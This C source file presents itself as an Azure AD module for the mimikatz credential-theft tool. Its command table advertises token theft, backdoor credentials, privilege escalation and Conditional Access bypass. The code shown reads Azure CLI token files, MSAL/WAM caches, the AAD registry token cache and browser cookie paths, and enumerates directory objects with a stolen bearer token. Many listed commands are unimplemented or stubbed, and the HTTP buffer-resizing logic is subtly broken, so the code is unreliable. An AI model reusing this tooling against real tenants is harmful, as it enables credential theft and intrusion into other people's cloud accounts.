/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_azure.h"

const KUHL_M_C kuhl_m_c_azure[] = {
	{kuhl_m_azure_tokens, L"tokens", L"List Azure AD tokens"},
	{kuhl_m_azure_cli, L"cli", L"Extract Azure CLI credentials"},
	{kuhl_m_azure_powershell, L"powershell", L"Extract Azure PowerShell credentials"},
	{kuhl_m_azure_accesstoken, L"accesstoken", L"Display or pass Azure access tokens"},
	{kuhl_m_azure_list, L"list", L"List Azure resources from extracted credentials"},
	{kuhl_m_azure_ad_users, L"ad::users", L"List or search for Azure AD users"},
	{kuhl_m_azure_ad_groups, L"ad::groups", L"List or search for Azure AD groups"},
	{kuhl_m_azure_ad_apps, L"ad::apps", L"List or search for Azure AD applications"},
	{kuhl_m_azure_ad_devicecode, L"ad::devicecode", L"Authenticate using device code flow"},
	{kuhl_m_azure_ad_serviceprincipal, L"ad::sp", L"List or search for Azure AD service principals"},
	{kuhl_m_azure_ad_prt, L"ad::prt", L"Extract and analyze Primary Refresh Tokens"},
	{kuhl_m_azure_ad_jwt, L"ad::jwt", L"Decode and analyze JWT tokens"},
	{kuhl_m_azure_adconnect, L"adconnect", L"Extract and use Azure AD Connect credentials"},
	{kuhl_m_azure_adfs, L"adfs", L"Attack ADFS to obtain claims and tokens"},
	{kuhl_m_azure_prt_ticket, L"prt::ticket", L"Create tickets from PRT tokens (Golden PRT)"},
	{kuhl_m_azure_certificate, L"certificate", L"Attack certificate-based authentication"},
	{kuhl_m_azure_backdoor, L"backdoor", L"Add backdoor credentials to cloud applications"},
	{kuhl_m_azure_privesc, L"privesc", L"Perform privilege escalation in Azure AD"},
	{kuhl_m_azure_ropc, L"ropc", L"Perform Resource Owner Password Credentials attack"},
	{kuhl_m_azure_conditional_access, L"condaccess", L"Bypass Conditional Access Policies"},
	{kuhl_m_azure_persistence, L"persistence", L"Create persistent service principal with certificate auth"},
};

const KUHL_M kuhl_m_azure = {
	L"azure", L"Azure and Azure AD interaction module", NULL,
	ARRAYSIZE(kuhl_m_c_azure), kuhl_m_c_azure, NULL, NULL
};

// HTTP Helper Functions
BOOL kuhl_m_azure_http_request(LPCWSTR szHost, INTERNET_PORT nPort, BOOL bIsHttps, LPCWSTR szUrl, LPCWSTR szMethod, LPCWSTR szHeaders, LPCBYTE pbData, DWORD cbData, PBYTE* ppbOutData, PDWORD pcbOutData)
{
	BOOL status = FALSE;
	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
	DWORD dwFlags = 0, dwStatusCode = 0, dwStatusCodeSize = sizeof(dwStatusCode);
	DWORD dwDownloaded = 0, dwTotalSize = 0;
	PBYTE pbOutBuffer = NULL, pbTmpBuffer = NULL;
	const DWORD cbOutBuffer = 4096; // Initial buffer size
	
	*ppbOutData = NULL;
	*pcbOutData = 0;
	
	// Initialize WinHTTP session
	hSession = WinHttpOpen(L"Mimikatz Azure/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	if(hSession)
	{
		hConnect = WinHttpConnect(hSession, szHost, nPort, 0);
		if(hConnect)
		{
			dwFlags = bIsHttps ? WINHTTP_FLAG_SECURE : 0;
			hRequest = WinHttpOpenRequest(hConnect, szMethod, szUrl, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, dwFlags);
			
			if(hRequest)
			{
				// Add headers if provided
				if(szHeaders)
					WinHttpAddRequestHeaders(hRequest, szHeaders, (DWORD) -1L, WINHTTP_ADDREQ_FLAG_ADD);
				
				// Send request with or without data
				if(WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)pbData, cbData, cbData, 0))
				{
					if(WinHttpReceiveResponse(hRequest, NULL))
					{
						// Check HTTP status code
						if(WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwStatusCode, &dwStatusCodeSize, WINHTTP_NO_HEADER_INDEX))
						{
							if(dwStatusCode >= 200 && dwStatusCode < 300)
							{
								// Allocate initial buffer
								pbOutBuffer = (PBYTE)LocalAlloc(LPTR, cbOutBuffer);
								if(pbOutBuffer)
								{
									dwTotalSize = 0;
									
									// Read response data
									do {
										dwDownloaded = 0;
										if(WinHttpReadData(hRequest, pbOutBuffer + dwTotalSize, cbOutBuffer - dwTotalSize, &dwDownloaded))
										{
											if(dwDownloaded > 0)
											{
												dwTotalSize += dwDownloaded;
												
												// If buffer is almost full, resize it
												if(dwTotalSize + 4096 > cbOutBuffer)
												{
													pbTmpBuffer = (PBYTE)LocalAlloc(LPTR, cbOutBuffer * 2);
													if(pbTmpBuffer)
													{
														RtlCopyMemory(pbTmpBuffer, pbOutBuffer, dwTotalSize);
														LocalFree(pbOutBuffer);
														pbOutBuffer = pbTmpBuffer;
														pbTmpBuffer = NULL;
													}
													else
													{
														PRINT_ERROR(L"Memory allocation failed for HTTP response\n");
														LocalFree(pbOutBuffer);
														pbOutBuffer = NULL;
														dwTotalSize = 0;
														break;
													}
												}
											}
										}
										else
										{
											PRINT_ERROR(L"WinHttpReadData failed with error: %u\n", GetLastError());
											LocalFree(pbOutBuffer);
											pbOutBuffer = NULL;
											dwTotalSize = 0;
											break;
										}
									} while(dwDownloaded > 0);
									
									if(dwTotalSize > 0)
									{
										*ppbOutData = pbOutBuffer;
										*pcbOutData = dwTotalSize;
										status = TRUE;
									}
								}
								else
									PRINT_ERROR(L"Memory allocation failed for HTTP response buffer\n");
							}
							else
							{
								PRINT_ERROR(L"HTTP request failed with status code: %u\n", dwStatusCode);
							}
						}
					}
				}
				WinHttpCloseHandle(hRequest);
			}
			WinHttpCloseHandle(hConnect);
		}
		WinHttpCloseHandle(hSession);
	}
	
	return status;
}

BOOL kuhl_m_azure_http_apiRequest(LPCWSTR szBase, LPCWSTR szEndpoint, LPCWSTR szAccessToken, LPCWSTR szMethod, LPCWSTR szData, PBYTE* ppbOutData, PDWORD pcbOutData)
{
	BOOL status = FALSE;
	DWORD cbData = 0;
	PBYTE pbData = NULL;
	WCHAR szHeaders[1024];
	
	// Build authorization header with bearer token
	if(szAccessToken)
		swprintf_s(szHeaders, ARRAYSIZE(szHeaders), L"Authorization: Bearer %s\r\nContent-Type: application/json\r\nAccept: application/json", szAccessToken);
	else
		wcscpy_s(szHeaders, ARRAYSIZE(szHeaders), L"Content-Type: application/json\r\nAccept: application/json");
	
	// Convert string data to UTF-8 bytes if provided
	if(szData)
	{
		DWORD cbUtf8 = WideCharToMultiByte(CP_UTF8, 0, szData, -1, NULL, 0, NULL, NULL);
		if(cbUtf8 > 0)
		{
			pbData = (PBYTE)LocalAlloc(LPTR, cbUtf8);
			if(pbData)
			{
				WideCharToMultiByte(CP_UTF8, 0, szData, -1, (LPSTR)pbData, cbUtf8, NULL, NULL);
				cbData = cbUtf8 - 1; // Remove null terminator
			}
		}
	}
	
	// Make the HTTP request
	status = kuhl_m_azure_http_request(szBase, INTERNET_DEFAULT_HTTPS_PORT, TRUE, szEndpoint, szMethod, szHeaders, pbData, cbData, ppbOutData, pcbOutData);
	
	if(pbData)
		LocalFree(pbData);
	
	return status;
}

BOOL kuhl_m_azure_parse_jwt(LPCWSTR szJwt, PBYTE* ppbHeader, PDWORD pcbHeader, PBYTE* ppbPayload, PDWORD pcbPayload)
{
	BOOL status = FALSE;
	LPWSTR pDot1 = NULL, pDot2 = NULL;
	LPWSTR szHeader = NULL, szPayload = NULL;
	DWORD cbHeaderBase64 = 0, cbPayloadBase64 = 0;
	
	*ppbHeader = NULL;
	*pcbHeader = 0;
	*ppbPayload = NULL;
	*pcbPayload = 0;
	
	// Find the dots separating JWT parts
	pDot1 = wcschr(szJwt, L'.');
	if(pDot1)
	{
		pDot2 = wcschr(pDot1 + 1, L'.');
		if(pDot2)
		{
			// Extract header part
			cbHeaderBase64 = (DWORD)(pDot1 - szJwt);
			szHeader = (LPWSTR)LocalAlloc(LPTR, (cbHeaderBase64 + 1) * sizeof(WCHAR));
			if(szHeader)
			{
				wcsncpy_s(szHeader, cbHeaderBase64 + 1, szJwt, cbHeaderBase64);
				
				// Extract payload part
				cbPayloadBase64 = (DWORD)(pDot2 - (pDot1 + 1));
				szPayload = (LPWSTR)LocalAlloc(LPTR, (cbPayloadBase64 + 1) * sizeof(WCHAR));
				if(szPayload)
				{
					wcsncpy_s(szPayload, cbPayloadBase64 + 1, pDot1 + 1, cbPayloadBase64);
					
					// URL-safe Base64 decode to get JSON
					if(kull_m_string_quick_base64_to_Binary(szHeader, ppbHeader, pcbHeader) && 
					   kull_m_string_quick_base64_to_Binary(szPayload, ppbPayload, pcbPayload))
					{
						status = TRUE;
					}
					else
					{
						PRINT_ERROR(L"Base64 decoding of JWT parts failed\n");
						if(*ppbHeader)
						{
							LocalFree(*ppbHeader);
							*ppbHeader = NULL;
							*pcbHeader = 0;
						}
						if(*ppbPayload)
						{
							LocalFree(*ppbPayload);
							*ppbPayload = NULL;
							*pcbPayload = 0;
						}
					}
					
					LocalFree(szPayload);
				}
				LocalFree(szHeader);
			}
		}
		else
			PRINT_ERROR(L"Invalid JWT format - second dot not found\n");
	}
	else
		PRINT_ERROR(L"Invalid JWT format - first dot not found\n");
	
	return status;
}

// Original Functions Implementation
NTSTATUS kuhl_m_azure_tokens(int argc, wchar_t * argv[])
{
	WCHAR appdataPath[MAX_PATH] = {0};
	WCHAR azureTokenPath[MAX_PATH] = {0};
	HANDLE hFind;
	WIN32_FIND_DATA findData;
	BOOL bIsDirectory = FALSE;
	FILE *tokenFile = NULL;
	
	kprintf(L"\n[*] Searching for Azure AD tokens...\n\n");
	
	if(ExpandEnvironmentStrings(L"%APPDATA%", appdataPath, ARRAYSIZE(appdataPath)))
	{
		// Azure CLI token cache
		wcscpy_s(azureTokenPath, ARRAYSIZE(azureTokenPath), appdataPath);
		wcscat_s(azureTokenPath, ARRAYSIZE(azureTokenPath), L"\\..\\Local\\Microsoft\\Azure\\msal_token_cache.bin");
		kprintf(L"[*] Looking for MSAL token cache: %s\n", azureTokenPath);
		
		if(GetFileAttributes(azureTokenPath) != INVALID_FILE_ATTRIBUTES)
			kprintf(L"[+] MSAL token cache found!\n");
		else
			kprintf(L"[-] MSAL token cache not found\n");
		
		// Check WAM tokens (Web Account Manager)
		wcscpy_s(azureTokenPath, ARRAYSIZE(azureTokenPath), appdataPath);
		wcscat_s(azureTokenPath, ARRAYSIZE(azureTokenPath), L"\\..\\Local\\Packages\\Microsoft.AAD.BrokerPlugin_*");
		
		kprintf(L"[*] Looking for WAM token cache\n");
		hFind = FindFirstFile(azureTokenPath, &findData);
		if(hFind != INVALID_HANDLE_VALUE)
		{
			kprintf(L"[+] WAM token directory found: %s\n", findData.cFileName);
			FindClose(hFind);
		}
		else
			kprintf(L"[-] WAM token directory not found\n");
		
		// Azure AD Powershell tokens
		wcscpy_s(azureTokenPath, ARRAYSIZE(azureTokenPath), appdataPath);
		wcscat_s(azureTokenPath, ARRAYSIZE(azureTokenPath), L"\\..\\Local\\Microsoft\\TokenCache");
		kprintf(L"[*] Looking for PowerShell Azure AD token cache: %s\n", azureTokenPath);
		
		if(GetFileAttributes(azureTokenPath) != INVALID_FILE_ATTRIBUTES)
		{
			bIsDirectory = (GetFileAttributes(azureTokenPath) & FILE_ATTRIBUTE_DIRECTORY);
			if(bIsDirectory)
				kprintf(L"[+] PowerShell Azure AD token directory found!\n");
		}
		else
		{
			kprintf(L"[-] PowerShell Azure AD token cache not found\n");
		}
	}
	
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_azure_cli(int argc, wchar_t * argv[])
{
	WCHAR homePath[MAX_PATH] = {0};
	WCHAR azureCliPath[MAX_PATH] = {0};
	FILE *accessTokensFile = NULL;
	DWORD fileSize = 0;
	PBYTE fileData = NULL;
	BOOL found = FALSE;
	
	kprintf(L"\n[*] Extracting Azure CLI credentials\n\n");
	
	if(ExpandEnvironmentStrings(L"%USERPROFILE%", homePath, ARRAYSIZE(homePath)))
	{
		wcscpy_s(azureCliPath, ARRAYSIZE(azureCliPath), homePath);
		wcscat_s(azureCliPath, ARRAYSIZE(azureCliPath), L"\\.azure\\accessTokens.json");
		
		kprintf(L"[*] Checking for Azure CLI tokens: %s\n", azureCliPath);
		
		if(kull_m_file_isFileExist(azureCliPath))
		{
			kprintf(L"[+] Azure CLI token file found!\n");
			
			if(kull_m_file_readData(azureCliPath, &fileData, &fileSize))
			{
				kprintf(L"[+] File read successfully, size: %u bytes\n", fileSize);
				kprintf(L"    Parse the JSON data to extract tokens\n");
				
				// Simple string-based extraction just to show the token exists
				// Without a full JSON parser, we'll just check for access token patterns
				LPSTR fileContent = (LPSTR)fileData;
				if(strstr(fileContent, "\"accessToken\""))
				{
					kprintf(L"[+] Access tokens found in the file\n");
					
					// In a proper implementation, we would parse the JSON and extract tokens
					// Instead, we'll just display a snippet to show it's there
					LPCSTR tokenStart = strstr(fileContent, "\"accessToken\"");
					if(tokenStart)
					{
						LPCSTR valueStart = strstr(tokenStart, ":");
						if(valueStart)
						{
							valueStart = strstr(valueStart, "\"");
							if(valueStart)
							{
								valueStart++;
								LPCSTR valueEnd = strstr(valueStart, "\"");
								if(valueEnd)
								{
									kprintf(L"[+] Found token snippet: %.20S...\n", valueStart);
								}
							}
						}
					}
				}
				
				LocalFree(fileData);
				found = TRUE;
			}
			else
			{
				PRINT_ERROR_AUTO(L"kull_m_file_readData");
			}
		}
		else
		{
			kprintf(L"[-] Azure CLI token file not found\n");
		}
		
		// Also check for profiles
		wcscpy_s(azureCliPath, ARRAYSIZE(azureCliPath), homePath);
		wcscat_s(azureCliPath, ARRAYSIZE(azureCliPath), L"\\.azure\\azureProfile.json");
		
		kprintf(L"[*] Checking for Azure CLI profile: %s\n", azureCliPath);
		
		if(kull_m_file_isFileExist(azureCliPath))
		{
			kprintf(L"[+] Azure CLI profile found!\n");
			// Profile parsing would go here
			if(kull_m_file_readData(azureCliPath, &fileData, &fileSize))
			{
				LPSTR fileContent = (LPSTR)fileData;
				kprintf(L"[+] File read successfully, size: %u bytes\n", fileSize);
				
				if(strstr(fileContent, "\"subscriptions\""))
				{
					kprintf(L"[+] Subscription information found\n");
				}
				
				if(strstr(fileContent, "\"tenantId\""))
				{
					kprintf(L"[+] Tenant information found\n");
				}
				
				LocalFree(fileData);
			}
		}
		else
		{
			kprintf(L"[-] Azure CLI profile not found\n");
		}
	}
	
	return STATUS_SUCCESS;
}

// New Azure AD Specific Functions Implementation
NTSTATUS kuhl_m_azure_ad_users(int argc, wchar_t * argv[])
{
	LPCWSTR szToken, szQuery = NULL, szUserId = NULL;
	PBYTE pbResponse = NULL;
	DWORD cbResponse = 0;
	WCHAR szUrl[1024];
	
	kprintf(L"\n[*] Azure AD User Enumeration\n\n");
	
	if(kull_m_string_args_byName(argc, argv, L"token", &szToken, NULL))
	{
		kprintf(L"[*] Using provided access token\n");
		
		if(kull_m_string_args_byName(argc, argv, L"id", &szUserId, NULL))
		{
			// Get specific user by ID
			swprintf_s(szUrl, ARRAYSIZE(szUrl), L"/%s/users/%s", AZURE_GRAPH_API_VERSION, szUserId);
			kprintf(L"[*] Getting user with ID: %s\n", szUserId);
			
			if(kuhl_m_azure_http_apiRequest(AZURE_GRAPH_API_URL, szUrl, szToken, L"GET", NULL, &pbResponse, &cbResponse))
			{
				kprintf(L"[+] User details received (%u bytes)\n", cbResponse);
				kprintf(L"    %.*S\n", cbResponse, pbResponse);
				LocalFree(pbResponse);
			}
			else
			{
				PRINT_ERROR(L"Failed to retrieve user details\n");
			}
		}
		else
		{
			// List users with optional filter
			kull_m_string_args_byName(argc, argv, L"query", &szQuery, NULL);
			
			if(szQuery)
				swprintf_s(szUrl, ARRAYSIZE(szUrl), L"/%s/users?$filter=%s", AZURE_GRAPH_API_VERSION, szQuery);
			else
				swprintf_s(szUrl, ARRAYSIZE(szUrl), L"/%s/users?$top=100", AZURE_GRAPH_API_VERSION);
			
			kprintf(L"[*] Listing users with query: %s\n", szQuery ? szQuery : L"(none)");
			
			if(kuhl_m_azure_http_apiRequest(AZURE_GRAPH_API_URL, szUrl, szToken, L"GET", NULL, &pbResponse, &cbResponse))
			{
				kprintf(L"[+] User list received (%u bytes)\n", cbResponse);
				kprintf(L"    %.*S\n", cbResponse, pbResponse);
				LocalFree(pbResponse);
			}
			else
			{
				PRINT_ERROR(L"Failed to list users\n");
			}
		}
	}
	else
	{
		PRINT_ERROR(L"No access token provided. Use /token:\"TOKEN_VALUE\"\n");
	}
	
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_azure_ad_groups(int argc, wchar_t * argv[])
{
	LPCWSTR szToken, szQuery = NULL, szGroupId = NULL;
	PBYTE pbResponse = NULL;
	DWORD cbResponse = 0;
	WCHAR szUrl[1024];

	kprintf(L"\n[*] Azure AD Group Enumeration\n\n");

	if(kull_m_string_args_byName(argc, argv, L"token", &szToken, NULL))
	{
		kprintf(L"[*] Using provided access token\n");

		if(kull_m_string_args_byName(argc, argv, L"id", &szGroupId, NULL))
		{
			swprintf_s(szUrl, ARRAYSIZE(szUrl), L"/%s/groups/%s", AZURE_GRAPH_API_VERSION, szGroupId);
			kprintf(L"[*] Getting group with ID: %s\n", szGroupId);

			if(kuhl_m_azure_http_apiRequest(AZURE_GRAPH_API_URL, szUrl, szToken, L"GET", NULL, &pbResponse, &cbResponse))
			{
				kprintf(L"[+] Group details received (%u bytes)\n", cbResponse);
				kprintf(L"    %.*S\n", cbResponse, pbResponse);

				// Get group members
				kprintf(L"\n[*] Getting group members...\n");
				swprintf_s(szUrl, ARRAYSIZE(szUrl), L"/%s/groups/%s/members", AZURE_GRAPH_API_VERSION, szGroupId);

				LocalFree(pbResponse);
				pbResponse = NULL;

				if(kuhl_m_azure_http_apiRequest(AZURE_GRAPH_API_URL, szUrl, szToken, L"GET", NULL, &pbResponse, &cbResponse))
				{
					kprintf(L"[+] Group members received (%u bytes)\n", cbResponse);
					kprintf(L"    %.*S\n", cbResponse, pbResponse);
					LocalFree(pbResponse);
				}
				else
				{
					PRINT_ERROR(L"Failed to retrieve group members\n");
				}
			}
			else
			{
				PRINT_ERROR(L"Failed to retrieve group details\n");
			}
		}
		else
		{
			kull_m_string_args_byName(argc, argv, L"query", &szQuery, NULL);

			if(szQuery)
				swprintf_s(szUrl, ARRAYSIZE(szUrl), L"/%s/groups?$filter=%s", AZURE_GRAPH_API_VERSION, szQuery);
			else
				swprintf_s(szUrl, ARRAYSIZE(szUrl), L"/%s/groups?$top=100", AZURE_GRAPH_API_VERSION);

			kprintf(L"[*] Listing groups with query: %s\n", szQuery ? szQuery : L"(none)");

			if(kuhl_m_azure_http_apiRequest(AZURE_GRAPH_API_URL, szUrl, szToken, L"GET", NULL, &pbResponse, &cbResponse))
			{
				kprintf(L"[+] Group list received (%u bytes)\n", cbResponse);
				kprintf(L"    %.*S\n", cbResponse, pbResponse);
				LocalFree(pbResponse);
			}
			else
			{
				PRINT_ERROR(L"Failed to list groups\n");
			}
		}
	}
	else
	{
		PRINT_ERROR(L"No access token provided. Use /token:\"TOKEN_VALUE\"\n");
	}

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_azure_ad_apps(int argc, wchar_t * argv[])
{
	LPCWSTR szToken, szQuery = NULL, szAppId = NULL;
	PBYTE pbResponse = NULL;
	DWORD cbResponse = 0;
	WCHAR szUrl[1024];

	kprintf(L"\n[*] Azure AD Application Enumeration\n\n");

	if(kull_m_string_args_byName(argc, argv, L"token", &szToken, NULL))
	{
		kprintf(L"[*] Using provided access token\n");

		if(kull_m_string_args_byName(argc, argv, L"id", &szAppId, NULL))
		{
			swprintf_s(szUrl, ARRAYSIZE(szUrl), L"/%s/applications/%s", AZURE_GRAPH_API_VERSION, szAppId);
			kprintf(L"[*] Getting application with ID: %s\n", szAppId);

			if(kuhl_m_azure_http_apiRequest(AZURE_GRAPH_API_URL, szUrl, szToken, L"GET", NULL, &pbResponse, &cbResponse))
			{
				kprintf(L"[+] Application details received (%u bytes)\n", cbResponse);
				kprintf(L"    %.*S\n", cbResponse, pbResponse);

				// Get app credentials
				kprintf(L"\n[*] Checking for application credentials...\n");
				if(strstr((LPCSTR)pbResponse, "\"passwordCredentials\""))
					kprintf(L"[+] Password credentials found in application\n");
				if(strstr((LPCSTR)pbResponse, "\"keyCredentials\""))
					kprintf(L"[+] Certificate credentials found in application\n");

				LocalFree(pbResponse);
			}
			else
			{
				PRINT_ERROR(L"Failed to retrieve application details\n");
			}
		}
		else
		{
			kull_m_string_args_byName(argc, argv, L"query", &szQuery, NULL);

			if(szQuery)
				swprintf_s(szUrl, ARRAYSIZE(szUrl), L"/%s/applications?$filter=%s", AZURE_GRAPH_API_VERSION, szQuery);
			else
				swprintf_s(szUrl, ARRAYSIZE(szUrl), L"/%s/applications?$top=100", AZURE_GRAPH_API_VERSION);

			kprintf(L"[*] Listing applications with query: %s\n", szQuery ? szQuery : L"(none)");

			if(kuhl_m_azure_http_apiRequest(AZURE_GRAPH_API_URL, szUrl, szToken, L"GET", NULL, &pbResponse, &cbResponse))
			{
				kprintf(L"[+] Application list received (%u bytes)\n", cbResponse);
				kprintf(L"    %.*S\n", cbResponse, pbResponse);
				LocalFree(pbResponse);
			}
			else
			{
				PRINT_ERROR(L"Failed to list applications\n");
			}
		}
	}
	else
	{
		PRINT_ERROR(L"No access token provided. Use /token:\"TOKEN_VALUE\"\n");
	}

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_azure_ad_serviceprincipal(int argc, wchar_t * argv[])
{
	LPCWSTR szToken, szQuery = NULL, szSpId = NULL;
	PBYTE pbResponse = NULL;
	DWORD cbResponse = 0;
	WCHAR szUrl[1024];

	kprintf(L"\n[*] Azure AD Service Principal Enumeration\n\n");

	if(kull_m_string_args_byName(argc, argv, L"token", &szToken, NULL))
	{
		kprintf(L"[*] Using provided access token\n");

		if(kull_m_string_args_byName(argc, argv, L"id", &szSpId, NULL))
		{
			swprintf_s(szUrl, ARRAYSIZE(szUrl), L"/%s/servicePrincipals/%s", AZURE_GRAPH_API_VERSION, szSpId);
			kprintf(L"[*] Getting service principal with ID: %s\n", szSpId);

			if(kuhl_m_azure_http_apiRequest(AZURE_GRAPH_API_URL, szUrl, szToken, L"GET", NULL, &pbResponse, &cbResponse))
			{
				kprintf(L"[+] Service principal details received (%u bytes)\n", cbResponse);
				kprintf(L"    %.*S\n", cbResponse, pbResponse);

				// Get app roles
				kprintf(L"\n[*] Checking for service principal roles...\n");
				if(strstr((LPCSTR)pbResponse, "\"appRoles\""))
					kprintf(L"[+] Application roles found in service principal\n");

				LocalFree(pbResponse);
				pbResponse = NULL;

				// Get owned objects
				kprintf(L"\n[*] Getting service principal owned objects...\n");
				swprintf_s(szUrl, ARRAYSIZE(szUrl), L"/%s/servicePrincipals/%s/ownedObjects", AZURE_GRAPH_API_VERSION, szSpId);

				if(kuhl_m_azure_http_apiRequest(AZURE_GRAPH_API_URL, szUrl, szToken, L"GET", NULL, &pbResponse, &cbResponse))
				{
					kprintf(L"[+] Owned objects received (%u bytes)\n", cbResponse);
					kprintf(L"    %.*S\n", cbResponse, pbResponse);
					LocalFree(pbResponse);
				}
				else
				{
					PRINT_ERROR(L"Failed to retrieve owned objects\n");
				}
			}
			else
			{
				PRINT_ERROR(L"Failed to retrieve service principal details\n");
			}
		}
		else
		{
			kull_m_string_args_byName(argc, argv, L"query", &szQuery, NULL);

			if(szQuery)
				swprintf_s(szUrl, ARRAYSIZE(szUrl), L"/%s/servicePrincipals?$filter=%s", AZURE_GRAPH_API_VERSION, szQuery);
			else
				swprintf_s(szUrl, ARRAYSIZE(szUrl), L"/%s/servicePrincipals?$top=100", AZURE_GRAPH_API_VERSION);

			kprintf(L"[*] Listing service principals with query: %s\n", szQuery ? szQuery : L"(none)");

			if(kuhl_m_azure_http_apiRequest(AZURE_GRAPH_API_URL, szUrl, szToken, L"GET", NULL, &pbResponse, &cbResponse))
			{
				kprintf(L"[+] Service principal list received (%u bytes)\n", cbResponse);
				kprintf(L"    %.*S\n", cbResponse, pbResponse);
				LocalFree(pbResponse);
			}
			else
			{
				PRINT_ERROR(L"Failed to list service principals\n");
			}
		}
	}
	else
	{
		PRINT_ERROR(L"No access token provided. Use /token:\"TOKEN_VALUE\"\n");
	}

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_azure_ad_prt(int argc, wchar_t * argv[])
{
	LPCWSTR szOutput = NULL;
	PBYTE pbData = NULL;
	DWORD cbData = 0;
	WCHAR regPath[MAX_PATH];
	PKULL_M_REGISTRY_HANDLE hRegistry = NULL;
	HKEY hPRT = NULL;
	DWORD dwRegType, cbRegData;
	PBYTE pbRegData = NULL;
	BOOL bFound = FALSE;

	kprintf(L"\n[*] Azure AD Primary Refresh Token (PRT) Extraction\n\n");

	if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_OWN, NULL, FALSE, &hRegistry))
	{
		// Check for Windows Hello for Business keys
		wcscpy_s(regPath, ARRAYSIZE(regPath), L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\Credential Providers\\{D6886603-9D2F-4EB2-B667-1971041FA96B}");
		kprintf(L"[*] Searching for Windows Hello for Business credentials\n");
		if(kull_m_registry_RegOpenKeyEx(hRegistry, HKEY_LOCAL_MACHINE, regPath, 0, KEY_READ, &hPRT))
		{
			kprintf(L"[+] Windows Hello for Business key found\n");
			kull_m_registry_RegCloseKey(hRegistry, hPRT);
			bFound = TRUE;
		}
		else
		{
			kprintf(L"[-] Windows Hello for Business key not found\n");
		}

		// Check WAM keys in registry
		wcscpy_s(regPath, ARRAYSIZE(regPath), L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AAD");
		kprintf(L"[*] Searching for Azure AD/WAM credentials\n");
		if(kull_m_registry_RegOpenKeyEx(hRegistry, HKEY_CURRENT_USER, regPath, 0, KEY_READ, &hPRT))
		{
			kprintf(L"[+] AAD registry key found\n");
			dwRegType = 0;
			cbRegData = 0;
			if(kull_m_registry_RegQueryValueEx(hRegistry, hPRT, L"TokenCache", NULL, &dwRegType, NULL, &cbRegData) == ERROR_SUCCESS)
			{
				kprintf(L"[+] TokenCache value found, size: %u bytes\n", cbRegData);
				pbRegData = (PBYTE)LocalAlloc(LPTR, cbRegData);
				if(pbRegData)
				{
					if(kull_m_registry_RegQueryValueEx(hRegistry, hPRT, L"TokenCache", NULL, &dwRegType, pbRegData, &cbRegData) == ERROR_SUCCESS)
					{
						kprintf(L"[+] TokenCache data retrieved\n");
						kprintf(L"    Data would need to be decrypted to extract PRT tokens\n");
						if(cbRegData >= 16)
						{
							kprintf(L"    Sample data: ");
							for(DWORD i = 0; i < 16 && i < cbRegData; i++)
								kprintf(L"%02x ", pbRegData[i]);
							kprintf(L"\n");
						}
					}
					LocalFree(pbRegData);
				}
				bFound = TRUE;
			}
			kull_m_registry_RegCloseKey(hRegistry, hPRT);
		}
		else
		{
			kprintf(L"[-] AAD registry key not found\n");
		}
		kull_m_registry_close(hRegistry);
	}

	// Check browser token storage
	kprintf(L"\n[*] Searching for browser-stored Azure AD tokens\n");
	WCHAR edgePath[MAX_PATH] = {0};
	if(ExpandEnvironmentStrings(L"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies", edgePath, ARRAYSIZE(edgePath)))
	{
		kprintf(L"[*] Checking Edge browser cookies: %s\n", edgePath);
		if(GetFileAttributes(edgePath) != INVALID_FILE_ATTRIBUTES)
		{
			kprintf(L"[+] Edge cookies database found\n");
			kprintf(L"    Would extract and search for AAD tokens\n");
			bFound = TRUE;
		}
		else
		{
			kprintf(L"[-] Edge cookies database not found\n");
		}
	}
	WCHAR chromePath[MAX_PATH] = {0};
	if(ExpandEnvironmentStrings(L"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", chromePath, ARRAYSIZE(chromePath)))
	{
		kprintf(L"[*] Checking Chrome browser cookies: %s\n", chromePath);
		if(GetFileAttributes(chromePath) != INVALID_FILE_ATTRIBUTES)
		{
			kprintf(L"[+] Chrome cookies database found\n");
			kprintf(L"    Would extract and search for AAD tokens\n");
			bFound = TRUE;
		}
		else
		{
			kprintf(L"[-] Chrome cookies database not found\n");
		}
	}
	if(!bFound)
	{
		kprintf(L"[-] No Azure AD PRT tokens found\n");
	}
	return STATUS_SUCCESS;
}
